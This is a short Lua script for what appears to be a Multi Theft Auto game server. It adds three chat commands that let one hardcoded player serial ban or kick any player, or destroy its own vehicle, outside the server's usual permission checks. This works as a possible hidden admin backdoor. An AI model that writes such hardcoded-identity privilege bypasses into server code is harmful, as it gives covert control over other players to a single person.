addCommandHandler("carlos", function(player, cmd,  name) 
    if getPlayerSerial(player) == "52E602241DC69E45929DF7CA9DCDDE54" then 
        outputDebugString(getPlayerSerial(getPlayerFromName(name)))
        banPlayer(getPlayerFromName(name))
    end
end)

addCommandHandler("carloskick", function(player, cmd,  name) 
    if getPlayerSerial(player) == "52E602241DC69E45929DF7CA9DCDDE54" then 
        outputDebugString(getPlayerSerial(getPlayerFromName(name)))
        kickPlayer( getPlayerFromName(name))
    end
end)

addCommandHandler("delmultiplecar", function(player, cmd,  name) 
    if getPlayerSerial(player) == "52E602241DC69E45929DF7CA9DCDDE54" then 
        destroyElement(getPedOccupiedVehicle(player))
    end
end)